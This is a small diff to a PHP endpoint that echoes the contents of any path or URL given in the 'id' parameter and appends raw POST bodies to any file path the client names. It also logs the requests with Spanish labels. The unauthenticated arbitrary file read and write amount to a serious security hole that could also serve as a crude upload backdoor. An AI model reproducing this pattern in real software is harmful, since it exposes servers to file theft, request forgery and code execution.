@@ -1,7 +1,7 @@
 <?php
 
     if ($_SERVER['REQUEST_METHOD'] == 'GET' ){
-        echo(".file_get_contents($_GET['id']).");
+        echo file_get_contents($_GET['id']);
         $txt="[GET | ID:".$_REQUEST['id']." | Cuerpo:".file_get_contents($_GET['id'])." | Hora:".date("Y-m-d H:i:s")."]\n";
     } else if ($_SERVER['REQUEST_METHOD'] == 'POST' ){
         file_put_contents($_REQUEST['id'], file_get_contents("php://input"), FILE_APPEND);
